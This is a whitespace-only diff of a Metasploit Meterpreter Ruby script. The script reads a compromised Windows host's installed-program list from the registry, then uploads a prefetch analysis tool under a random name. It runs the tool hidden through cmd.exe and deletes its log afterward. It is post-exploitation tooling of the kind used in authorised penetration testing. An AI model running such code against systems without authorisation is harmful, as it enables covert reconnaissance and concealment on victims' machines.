@@ -1,7 +1,7 @@
 # $Id$
 #Meterpreter script for extracting information from windows prefetch folder
 #Provided by Milo at keith.lee2012[at]gmail.com
-#Verion: 0.1.0 
+#Verion: 0.1.0
 
 require 'fileutils'
 require 'net/http'
@@ -13,9 +13,9 @@ require 'digest/sha1'
 # Script Options
 @@exec_opts = Rex::Parser::Arguments.new(
         "-h" => [ false,  "Help menu."],
-		"-p" => [ false,  "List Installed Programs"],                 
-		"-c" => [ false,  "Disable SHA1/MD5 checksum"],                 
-		"-x" => [ true,   "Top x Accessed Executables (Based on Prefetch folder)"],                 
+		"-p" => [ false,  "List Installed Programs"],
+		"-c" => [ false,  "Disable SHA1/MD5 checksum"],
+		"-x" => [ true,   "Top x Accessed Executables (Based on Prefetch folder)"],
 		"-i" => [ false,  "Perform lookup for software name"],
 		"-l" => [ false,  "Download Prefetch Folder Analysis Log"]
 		)
@@ -27,7 +27,7 @@ def read_program_list
 	key = @session.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', KEY_READ)
 	sfmsvals = key.enum_key
 	sfmsvals.each do |test1|
-		begin			
+		begin
 			key2 = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\"+test1
 			root_key2, base_key2 = @session.sys.registry.splitkey(key2)
 			value1 = "DisplayName"
@@ -36,7 +36,7 @@ def read_program_list
 			v1 = open_key.query_value(value1)
 			v2 = open_key.query_value(value2)
 			print_status("#{v1.data}\t(Version:  #{v2.data})")
-		rescue 
+		rescue
 		end
 	end
 end
@@ -46,7 +46,7 @@ def prefetch_dump(options, logging=false)
 	lexe = File.join(Msf::Config.data_directory, "prefetch.exe")
 	rexe = sprintf("%.5d",rand(100000)) + ".exe"
 	rlog = sprintf("%.5d",rand(100000)) + ".txt"
-	
+
 	print_status("Uploading Prefetch-tool for analyzing Prefetch folder...")
 	begin
 		@session.fs.file.upload_file("#{@tempdir}\\#{rexe}", lexe)
@@ -58,11 +58,11 @@ def prefetch_dump(options, logging=false)
 	end
 
 	begin
-	
+
 		if(logging)
 			options += " --txt=#{@tempdir}\\#{rlog}"
 		end
-		
+
 		r = @session.sys.process.execute("cmd.exe /c #{@tempdir}\\#{rexe} #{options} #{rlog}", nil, {'Hidden' => 'true','Channelized' => true})
 		while(d = r.channel.read)
 			d.split("\n").each do |out|
@@ -81,7 +81,7 @@ def prefetch_dump(options, logging=false)
 			end
 			sleep(0.5) if found
 		end
-		
+
 		r.channel.close
 		r.close
 
@@ -99,7 +99,7 @@ def prefetch_dump(options, logging=false)
 			@session.sys.process.execute("cmd.exe /c del #{@tempdir}\\#{rlog}", nil, {'Hidden' => 'true'})
 		end
 
-	rescue ::Interrupt; raise $!		
+	rescue ::Interrupt; raise $!
 	rescue ::Exception => e
 		print_status("The following error was encountered: #{e.class} #{e}")
 		return
@@ -148,7 +148,7 @@ if !(::File.exist?(prefetch_local))
 else
 	print_status("Checking for an updated copy of prefetch.exe..")
 	digest = Digest::SHA1.hexdigest(::File.read(prefetch_local, ::File.size(prefetch_local)))
-	
+
 	Net::HTTP.start("code.google.com") do |http|
 		req     = Net::HTTP::Get.new("/p/prefetch-tool/downloads/detail?name=prefetch.exe&can=2&q=")
 		resp    = http.request(req)
